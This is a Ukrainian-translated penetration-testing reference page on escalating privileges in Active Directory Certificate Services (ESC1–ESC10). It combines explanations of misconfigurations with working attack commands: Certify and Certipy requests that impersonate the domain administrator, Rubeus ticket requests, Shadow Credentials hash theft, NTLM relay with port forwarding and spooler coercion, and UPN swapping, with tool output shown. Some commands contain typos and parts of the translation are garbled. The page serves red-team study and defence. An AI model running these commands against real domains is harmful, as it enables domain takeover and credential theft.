# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**Це резюме секцій технік ескалації постів:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів - ESC1

### Пояснення

### Неправильно налаштовані шаблони сертифікатів - ESC1 Пояснено

- **Права на реєстрацію надаються користувачам з низькими привілеями корпоративним ЦС.**
- **Затвердження менеджера не потрібне.**
- **Підписи авторизованого персоналу не потрібні.**
- **Безпекові дескриптори на шаблонах сертифікатів є надто дозволяючими, що дозволяє користувачам з низькими привілеями отримувати права на реєстрацію.**
- **Шаблони сертифікатів налаштовані для визначення EKU, які полегшують аутентифікацію:**
- Ідентифікатори розширеного використання ключів (EKU), такі як Аутентифікація клієнта (OID 1.3.6.1.5.5.7.3.2), Аутентифікація клієнта PKINIT (1.3.6.1.5.2.3.4), Вхід за допомогою смарт-картки (OID 1.3.6.1.4.1.311.20.2.2), Будь-яка мета (OID 2.5.29.37.0) або без EKU (SubCA) включені.
- **Шаблон дозволяє запитувачам включати subjectAltName у Запит на підпис сертифіката (CSR):**
- Active Directory (AD) надає пріоритет subjectAltName (SAN) у сертифікаті для перевірки особи, якщо він присутній. Це означає, що, вказуючи SAN у CSR, можна запросити сертифікат для імпersonації будь-якого користувача (наприклад, адміністратора домену). Чи може запитувач вказати SAN, вказується в об'єкті AD шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапора `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.

> [!CAUTION]
> Описана конфігурація дозволяє користувачам з низькими привілеями запитувати сертифікати з будь-яким вибраним SAN, що дозволяє аутентифікацію як будь-якого доменного принципала через Kerberos або SChannel.

Ця функція іноді активується для підтримки генерації HTTPS або хост-сертифікатів на льоту продуктами або службами розгортання, або через брак розуміння.

Зазначено, що створення сертифіката з цією опцією викликає попередження, чого не відбувається, коли існуючий шаблон сертифіката (такий як шаблон `WebServer`, у якого активовано `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюється, а потім модифікується для включення OID аутентифікації.

### Зловживання

Щоб **знайти вразливі шаблони сертифікатів**, ви можете виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Щоб **зловживати цією вразливістю для видавання себе за адміністратора**, можна виконати:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Тоді ви можете перетворити згенерований **сертифікат у формат `.pfx`** і використовувати його для **автентифікації за допомогою Rubeus або certipy** знову:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Віконні бінарники "Certreq.exe" та "Certutil.exe" можуть бути використані для генерації PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перерахунок шаблонів сертифікатів у конфігураційній схемі лісу AD, зокрема тих, що не потребують затвердження або підписів, які мають EKU для клієнтської аутентифікації або Smart Card Logon, та з увімкненим прапором `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати, запустивши наступний LDAP запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані шаблони сертифікатів - ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Права на реєстрацію надаються користувачам з низькими привілеями через Enterprise CA.
2. Вимога на затвердження менеджером вимкнена.
3. Необхідність авторизованих підписів пропущена.
4. Надмірно дозволяючий дескриптор безпеки на шаблоні сертифіката надає права на реєстрацію сертифікатів користувачам з низькими привілеями.
5. **Шаблон сертифіката визначено так, щоб включати Any Purpose EKU або не мати EKU.**

**Any Purpose EKU** дозволяє зловмиснику отримати сертифікат для **будь-якої мети**, включаючи автентифікацію клієнта, автентифікацію сервера, підписання коду тощо. Така ж **техніка, що використовується для ESC3**, може бути застосована для експлуатації цього сценарію.

Сертифікати з **без EKU**, які діють як сертифікати підпорядкованого CA, можуть бути використані для **будь-якої мети** і **також можуть бути використані для підписання нових сертифікатів**. Отже, зловмисник може вказати довільні EKU або поля в нових сертифікатах, використовуючи сертифікат підпорядкованого CA.

Однак нові сертифікати, створені для **автентифікації домену**, не будуть функціонувати, якщо підпорядкований CA не довіряється об'єкту **`NTAuthCertificates`**, що є налаштуванням за замовчуванням. Проте зловмисник все ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифікатів. Ці сертифікати можуть бути потенційно **зловживані** для широкого спектру цілей (наприклад, підписання коду, автентифікація сервера тощо) і можуть мати значні наслідки для інших додатків у мережі, таких як SAML, AD FS або IPSec.

Щоб перерахувати шаблони, які відповідають цьому сценарію в конфігураційній схемі AD Forest, можна виконати наступний LDAP запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані шаблони агентів реєстрації - ESC3

### Пояснення

Цей сценарій схожий на перший і другий, але **зловживає** **іншим EKU** (Агент запиту сертифіката) та **2 різними шаблонами** (отже, має 2 набори вимог),

**EKU агента запиту сертифіката** (OID 1.3.6.1.4.1.311.20.2.1), відомий як **Агент реєстрації** в документації Microsoft, дозволяє суб'єкту **реєструватися** на **сертифікат** **від імені іншого користувача**.

**“Агент реєстрації”** реєструється в такому **шаблоні** і використовує отриманий **сертифікат для спільного підписання CSR від імені іншого користувача**. Потім він **надсилає** **спільно підписаний CSR** до CA, реєструючись у **шаблоні**, який **дозволяє “реєстрацію від імені”**, і CA відповідає **сертифікатом, що належить “іншому” користувачу**.

**Вимоги 1:**

- Права на реєстрацію надаються користувачам з низькими привілеями корпоративним CA.
- Вимога на затвердження менеджера пропускається.
- Немає вимоги на авторизовані підписи.
- Безпековий дескриптор шаблону сертифіката є надмірно дозволяючим, надаючи права на реєстрацію користувачам з низькими привілеями.
- Шаблон сертифіката включає EKU агента запиту сертифіката, що дозволяє запитувати інші шаблони сертифікатів від імені інших суб'єктів.

**Вимоги 2:**

- Корпоративний CA надає права на реєстрацію користувачам з низькими привілеями.
- Затвердження менеджера обходиться.
- Версія схеми шаблону є або 1, або перевищує 2, і вона вказує на вимогу політики застосування, яка вимагає EKU агента запиту сертифіката.
- EKU, визначений у шаблоні сертифіката, дозволяє доменну аутентифікацію.
- Обмеження для агентів реєстрації не застосовуються на CA.

### Зловживання

Ви можете використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy) для зловживання цим сценарієм:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Користувачі**, яким дозволено **отримувати** **сертифікат агента реєстрації**, шаблони, в яких агентам реєстрації дозволено реєструватися, та **облікові записи**, від імені яких агент реєстрації може діяти, можуть бути обмежені корпоративними ЦС. Це досягається шляхом відкриття `certsrc.msc` **додатку**, **клацання правою кнопкою миші на ЦС**, **вибору Властивості**, а потім **переміщення** на вкладку “Агенти реєстрації”.

Однак зазначено, що **за замовчуванням** налаштування для ЦС полягає в тому, щоб “**Не обмежувати агентів реєстрації**.” Коли обмеження для агентів реєстрації активується адміністраторами, встановлення його на “Обмежити агентів реєстрації” залишає конфігурацію надзвичайно ліберальною. Це дозволяє **Усім** отримати доступ до реєстрації в усіх шаблонах як будь-хто.

## Вразливий контроль доступу до шаблону сертифіката - ESC4

### **Пояснення**

**Секюріті дескриптор** на **шаблонах сертифікатів** визначає **дозволи**, які конкретні **AD принципали** мають щодо шаблону.

Якщо **зловмисник** має необхідні **дозволи** для **зміни** **шаблону** та **встановлення** будь-яких **експлуатованих неправильних налаштувань**, описаних у **попередніх розділах**, це може сприяти ескалації привілеїв.

Значні дозволи, що застосовуються до шаблонів сертифікатів, включають:

- **Власник:** Надає неявний контроль над об'єктом, дозволяючи змінювати будь-які атрибути.
- **FullControl:** Дозволяє повну владу над об'єктом, включаючи можливість змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінювати власника об'єкта на принципала під контролем зловмисника.
- **WriteDacl:** Дозволяє коригувати контроль доступу, потенційно надаючи зловмиснику FullControl.
- **WriteProperty:** Авторизує редагування будь-яких властивостей об'єкта.

### Зловживання

Приклад ескалації привілеїв, подібний до попереднього:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 - це коли користувач має права на запис над шаблоном сертифіката. Це може, наприклад, бути зловжито для переписування конфігурації шаблона сертифіката, щоб зробити шаблон вразливим до ESC1.

Як ми бачимо в наведеному вище шляху, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` має новий `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов'язана з сертифікатами, я також реалізував цю атаку, яка відома як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ось невеликий попередній перегляд команди `shadow auto` Certipy для отримання NT хешу жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката одним командою. За **замовчуванням** Certipy **перезаписує** конфігурацію, щоб зробити її **вразливою до ESC1**. Ми також можемо вказати **`-save-old` параметр для збереження старої конфігурації**, що буде корисно для **відновлення** конфігурації після нашої атаки.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Вразливий контроль доступу до об'єктів PKI - ESC5

### Пояснення

Широка мережа взаємопов'язаних відносин на основі ACL, яка включає кілька об'єктів, крім шаблонів сертифікатів і центру сертифікації, може вплинути на безпеку всієї системи AD CS. Ці об'єкти, які можуть суттєво вплинути на безпеку, охоплюють:

- Об'єкт комп'ютера AD сервера CA, який може бути скомпрометований через механізми, такі як S4U2Self або S4U2Proxy.
- RPC/DCOM сервер сервера CA.
- Будь-який нащадок об'єкта AD або контейнера в межах конкретного контейнерного шляху `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, але не обмежується, контейнерами та об'єктами, такими як контейнер шаблонів сертифікатів, контейнер центрів сертифікації, об'єкт NTAuthCertificates та контейнер послуг реєстрації.

Безпека системи PKI може бути скомпрометована, якщо зловмисник з низькими привілеями зможе отримати контроль над будь-яким з цих критичних компонентів.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

Тема, обговорена в [**пості CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), також торкається наслідків прапора **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, як зазначено Microsoft. Ця конфігурація, коли вона активована на Центрі сертифікації (CA), дозволяє включати **значення, визначені користувачем**, у **додаткову назву суб'єкта** для **будь-якого запиту**, включаючи ті, що створені з Active Directory®. Внаслідок цього, ця можливість дозволяє **зловмиснику** зареєструватися через **будь-який шаблон**, налаштований для **автентифікації** домену — зокрема, ті, що відкриті для реєстрації **непривілейованими** користувачами, такі як стандартний шаблон користувача. Як результат, сертифікат може бути отриманий, що дозволяє зловмиснику автентифікуватися як доменний адміністратор або **будь-яка інша активна сутність** в домені.

**Примітка**: Метод додавання **додаткових назв** у Запит на підпис сертифіката (CSR) через аргумент `-attrib "SAN:"` у `certreq.exe` (який називається “Пари Ім'я Значення”), представляє **контраст** з експлуатаційною стратегією SAN у ESC1. Тут відмінність полягає в **тому, як інформація про обліковий запис інкапсульована** — в атрибуті сертифіката, а не в розширенні.

### Зловживання

Щоб перевірити, чи активовано налаштування, організації можуть використовувати наступну команду з `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція в основному використовує **доступ до віддаленого реєстру**, отже, альтернативний підхід може бути:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Інструменти, такі як [**Certify**](https://github.com/GhostPack/Certify) та [**Certipy**](https://github.com/ly4k/Certipy), здатні виявляти цю неправильну конфігурацію та експлуатувати її:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Щоб змінити ці налаштування, припускаючи, що у вас є **права адміністратора домену** або еквівалентні, можна виконати наступну команду з будь-якої робочої станції:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Після оновлень безпеки травня 2022 року, нові видані **сертифікати** міститимуть **розширення безпеки**, яке включає **властивість `objectSid` запитувача**. Для ESC1 цей SID отримується з вказаного SAN. Однак для **ESC6** SID відображає **`objectSid` запитувача**, а не SAN.\
> Щоб експлуатувати ESC6, система повинна бути вразливою до ESC10 (Слабкі відображення сертифікатів), яке надає пріоритет **SAN над новим розширенням безпеки**.

## Вразливий контроль доступу до центру сертифікації - ESC7

### Атака 1

#### Пояснення

Контроль доступу для центру сертифікації підтримується через набір дозволів, які регулюють дії CA. Ці дозволи можна переглянути, отримавши доступ до `certsrv.msc`, клацнувши правою кнопкою миші на CA, вибравши властивості, а потім перейшовши на вкладку Безпека. Крім того, дозволи можна перерахувати, використовуючи модуль PSPKI з командами, такими як:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Це надає уявлення про основні права, а саме **`ManageCA`** та **`ManageCertificates`**, що відповідають ролям "адміністратор CA" та "менеджер сертифікатів" відповідно.

#### Зловживання

Наявність прав **`ManageCA`** на центрі сертифікації дозволяє суб'єкту віддалено маніпулювати налаштуваннями за допомогою PSPKI. Це включає в себе перемикання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`** для дозволу специфікації SAN у будь-якому шаблоні, що є критичним аспектом ескалації домену.

Спрощення цього процесу можливе за допомогою cmdlet **Enable-PolicyModuleFlag** PSPKI, що дозволяє вносити зміни без прямої взаємодії з GUI.

Володіння правами **`ManageCertificates`** полегшує затвердження очікуючих запитів, ефективно обходячи захист "затвердження менеджера сертифікатів CA".

Комбінація модулів **Certify** та **PSPKI** може бути використана для запиту, затвердження та завантаження сертифіката:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> У **попередньому нападі** **`Manage CA`** дозволи використовувалися для **включення** прапора **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання **ESC6 атаки**, але це не матиме жодного ефекту, поки служба CA (`CertSvc`) не буде перезапущена. Коли у користувача є право доступу **`Manage CA`**, користувач також має право **перезапустити службу**. Однак це **не означає, що користувач може перезапустити службу віддалено**. Крім того, E**SC6 може не працювати з коробки** у більшості патчених середовищ через оновлення безпеки травня 2022 року.

Тому тут представлено інший напад.

Пер prerequisites:

- Тільки **`ManageCA` дозвіл**
- **`Manage Certificates`** дозвіл (може бути наданий з **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** повинен бути **включений** (може бути включений з **`ManageCA`**)

Техніка базується на тому, що користувачі з правами доступу `Manage CA` _та_ `Manage Certificates` можуть **видавати невдалі запити на сертифікати**. Шаблон сертифіката **`SubCA`** є **вразливим до ESC1**, але **тільки адміністратори** можуть зареєструватися в шаблоні. Таким чином, **користувач** може **запросити** реєстрацію в **`SubCA`** - що буде **відхилено** - але **потім видано менеджером пізніше**.

#### Abuse

Ви можете **наділити себе правом доступу `Manage Certificates`**, додавши свого користувача як нового офіцера.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** може бути **увімкнений на CA** з параметром `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали попередні умови для цієї атаки, ми можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.

**Цей запит буде відхилено**, але ми збережемо приватний ключ і запишемо ідентифікатор запиту.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
З нашими **`Manage CA` та `Manage Certificates`** ми можемо **випустити запит на сертифікат, що не вдався** за допомогою команди `ca` та параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` та параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay до AD CS HTTP кінцевих точок – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **встановлено AD CS**, якщо існує **вразливий веб-інтерфейс для реєстрації** і принаймні один **шаблон сертифіката опубліковано**, що дозволяє **реєстрацію комп'ютерів домену та автентифікацію клієнтів** (такий як за замовчуванням **`Machine`** шаблон), стає можливим, щоб **будь-який комп'ютер з активною службою спулера був скомпрометований зловмисником**!

Кілька **методів реєстрації на основі HTTP** підтримуються AD CS, які доступні через додаткові серверні ролі, які можуть встановити адміністратори. Ці інтерфейси для реєстрації сертифікатів на основі HTTP вразливі до **атак NTLM реле**. Зловмисник з **скомпрометованої машини може видавати себе за будь-який обліковий запис AD, який автентифікується через вхідний NTLM**. В той час як зловмисник видає себе за обліковий запис жертви, ці веб-інтерфейси можуть бути доступні зловмиснику для **запиту сертифіката автентифікації клієнта, використовуючи шаблони сертифікатів `User` або `Machine`**.

- **Веб-інтерфейс реєстрації** (старий ASP-додаток, доступний за адресою `http://<caserver>/certsrv/`), за замовчуванням підтримує лише HTTP, що не забезпечує захисту від атак NTLM реле. Крім того, він явно дозволяє лише NTLM автентифікацію через свій заголовок Authorization HTTP, що робить більш безпечні методи автентифікації, такі як Kerberos, непридатними.
- **Служба реєстрації сертифікатів** (CES), **Політика реєстрації сертифікатів** (CEP) Веб-сервіс і **Служба реєстрації мережевих пристроїв** (NDES) за замовчуванням підтримують автентифікацію negotiate через свій заголовок Authorization HTTP. Автентифікація negotiate **підтримує як** Kerberos, так і **NTLM**, що дозволяє зловмиснику **знизити рівень до NTLM** автентифікації під час атак реле. Хоча ці веб-сервіси за замовчуванням активують HTTPS, HTTPS сам по собі **не захищає від атак NTLM реле**. Захист від атак NTLM реле для HTTPS-сервісів можливий лише тоді, коли HTTPS поєднується з прив'язкою каналу. На жаль, AD CS не активує Розширений захист для автентифікації на IIS, що є необхідним для прив'язки каналу.

Звичайною **проблемою** атак NTLM реле є **коротка тривалість сесій NTLM** та неможливість зловмисника взаємодіяти з сервісами, які **вимагають підписування NTLM**.

Проте, це обмеження подолано шляхом використання атаки NTLM реле для отримання сертифіката для користувача, оскільки термін дії сертифіката визначає тривалість сесії, а сертифікат може бути використаний з сервісами, які **вимагають підписування NTLM**. Для інструкцій щодо використання вкраденого сертифіката зверніться до:

{{#ref}}
account-persistence.md
{{#endref}}

Ще одне обмеження атак NTLM реле полягає в тому, що **машина, контрольована зловмисником, повинна бути автентифікована обліковим записом жертви**. Зловмисник може або чекати, або намагатися **примусити** цю автентифікацію:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` перераховує **включені HTTP AD CS кінцеві точки**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CAs) для зберігання кінцевих точок служби реєстрації сертифікатів (CES). Ці кінцеві точки можна розібрати та перерахувати, використовуючи інструмент **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання з Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання з [Certipy](https://github.com/ly4k/Certipy)

Запит на сертифікат за замовчуванням здійснюється Certipy на основі шаблону `Machine` або `User`, залежно від того, чи закінчується ім'я облікового запису, що передається, на `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.

Техніка, така як [PetitPotam](https://github.com/ly4k/PetitPotam), може бути використана для примусу аутентифікації. При роботі з контролерами домену необхідно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Новий значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відомий як ESC9, запобігає вбудовуванню **нового `szOID_NTDS_CA_SECURITY_EXT` безпекового розширення** в сертифікат. Цей прапор стає актуальним, коли `StrongCertificateBindingEnforcement` встановлено на `1` (значення за замовчуванням), що контрастує з налаштуванням `2`. Його значущість зростає в сценаріях, де може бути використано слабше відображення сертифікатів для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінює вимоги.

Умови, за яких налаштування цього прапора стає значущим, включають:

- `StrongCertificateBindingEnforcement` не налаштовано на `2` (за замовчуванням `1`), або `CertificateMappingMethods` включає прапор `UPN`.
- Сертифікат позначений прапором `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
- Будь-який EKU аутентифікації клієнта вказується сертифікатом.
- Доступні дозволи `GenericWrite` над будь-яким обліковим записом для компрометації іншого.

### Сценарій зловживання

Припустимо, що `John@corp.local` має дозволи `GenericWrite` над `Jane@corp.local`, з метою компрометації `Administrator@corp.local`. Шаблон сертифіката `ESC9`, в який `Jane@corp.local` дозволено реєструватися, налаштований з прапором `CT_FLAG_NO_SECURITY_EXTENSION` у своєму налаштуванні `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, завдяки `GenericWrite` `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Відповідно, `Jane`'s `userPrincipalName` змінюється на `Administrator`, навмисно пропускаючи частину домену `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця модифікація не порушує обмеження, оскільки `Administrator@corp.local` залишається відмінним як `userPrincipalName` `Administrator`.

Після цього запитується шаблон сертифіката `ESC9`, позначений як вразливий, як `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Зазначено, що `userPrincipalName` сертифіката відображає `Administrator`, без жодного “object SID”.

`userPrincipalName` `Jane` потім повертається до її оригінального, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба аутентифікації з виданим сертифікатом тепер дає NT хеш `Administrator@corp.local`. Команда повинна включати `-domain <domain>` через відсутність специфікації домену в сертифікаті:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Слабкі відображення сертифікатів - ESC10

### Пояснення

Два значення ключів реєстру на контролері домену відносяться до ESC10:

- Значення за замовчуванням для `CertificateMappingMethods` під `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` дорівнює `0x18` (`0x8 | 0x10`), раніше було встановлено на `0x1F`.
- Налаштування за замовчуванням для `StrongCertificateBindingEnforcement` під `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` дорівнює `1`, раніше `0`.

**Випадок 1**

Коли `StrongCertificateBindingEnforcement` налаштовано на `0`.

**Випадок 2**

Якщо `CertificateMappingMethods` включає біт `UPN` (`0x4`).

### Випадок зловживання 1

При налаштуванні `StrongCertificateBindingEnforcement` на `0`, обліковий запис A з правами `GenericWrite` може бути використаний для компрометації будь-якого облікового запису B.

Наприклад, маючи права `GenericWrite` на `Jane@corp.local`, зловмисник намагається скомпрометувати `Administrator@corp.local`. Процедура повторює ESC9, дозволяючи використовувати будь-який шаблон сертифіката.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, експлуатуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
В результаті, `Jane`'s `userPrincipalName` змінюється на `Administrator`, навмисно пропускаючи частину `@corp.local`, щоб уникнути порушення обмеження.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Наступним кроком запитується сертифікат, що дозволяє автентифікацію клієнта, від імені `Jane`, з використанням шаблону за замовчуванням `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` потім повертається до свого оригінального, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
